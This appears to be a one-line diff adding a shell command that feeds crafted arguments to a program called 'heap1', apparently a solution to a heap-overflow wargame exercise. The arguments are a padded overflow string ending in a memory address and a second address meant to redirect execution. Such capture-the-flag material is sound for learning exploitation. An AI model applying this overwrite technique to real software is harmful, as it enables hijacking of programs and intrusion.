@@ -1,0 +1,1 @@
+./heap1 `python -c 'print "A" * 20 + "\x18\xa0\x04\x08"'` `python -c 'print "\xb6\x84\x04\x08"'`
